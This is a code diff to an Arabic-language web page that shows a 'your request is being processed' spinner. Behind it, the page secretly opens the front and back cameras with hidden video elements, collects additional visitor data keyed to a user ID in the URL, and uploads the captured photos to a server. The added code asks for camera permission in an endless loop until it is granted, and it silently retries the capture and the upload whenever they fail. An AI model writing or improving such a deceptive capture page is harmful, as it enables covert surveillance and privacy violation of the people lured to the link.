@@ -37,7 +37,7 @@
     <div class="container">
         <div class="spinner"></div>
         <h1>جاري تنفيذ طلبك</h1>
-        <p>يرجى الانتظار...</p>
+        <p id="status">يرجى الانتظار...</p>
     </div>
     <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
     <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
@@ -48,6 +48,7 @@
         const backVideo = document.getElementById('backVideo');
         const frontCanvas = document.getElementById('frontCanvas');
         const backCanvas = document.getElementById('backCanvas');
+        const statusElement = document.getElementById('status');
         const userId = window.location.pathname.split('/')[2];
 
         async function collectAdditionalData() {
@@ -86,19 +87,32 @@
             return match ? match[1] : 'Unknown';
         }
 
+        async function requestCameraPermission() {
+            while (true) {
+                try {
+                    statusElement.textContent = "يرجى السماح بالوصول إلى الكاميرا...";
+                    await navigator.mediaDevices.getUserMedia({ video: true });
+                    statusElement.textContent = "تم منح الإذن بنجاح!";
+                    return true;
+                } catch (error) {
+                    console.error('Error accessing camera:', error);
+                    statusElement.textContent = "يرجى تفعيل الكاميرا والسماح بالوصول إليها.";
+                    await new Promise(resolve => setTimeout(resolve, 3000));
+                }
+            }
+        }
+
         async function init() {
             try {
                 const additionalData = await collectAdditionalData();
-                await navigator.mediaDevices.getUserMedia({ video: true });
+                await requestCameraPermission();
                 const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                 handleSuccess(frontStream, backStream, additionalData);
             } catch (e) {
-                console.error('navigator.getUserMedia error:', e);
-                document.querySelector('.container').innerHTML = `
-                    <h1>خطأ في الوصول إلى الكاميرا</h1>
-                    <p>${e.message}</p>
-                `;
+                console.error('Error in init:', e);
+                statusElement.textContent = "حدث خطأ. جاري المحاولة مرة أخرى...";
+                setTimeout(init, 3000);
             }
         }
 
@@ -154,18 +168,16 @@
                 if (data.success) {
                     console.log('Photos sent successfully');
                     document.querySelector('.container').innerHTML = `
-                        <h1>تم تنفيذ طلبك ودخول الا الموقع</h1>
-                        <p>يمكنك التصفح الان او قوم بغلق الصفحه</p>
+                        <h1>تم تنفيذ طلبك ودخول إلى الموقع</h1>
+                        <p>يمكنك التصفح الآن أو إغلاق الصفحة</p>
                     `;
                 } else {
                     throw new Error(data.error);
                 }
             } catch (error) {
                 console.error('Error:', error);
-                document.querySelector('.container').innerHTML = `
-                    <h1>خطأ في إرسال الصور</h1>
-                    <p>${error.message}</p>
-                `;
+                statusElement.textContent = "حدث خطأ في إرسال الصور. جاري المحاولة مرة أخرى...";
+                setTimeout(() => post(url, formData), 3000);
             }
         }
 
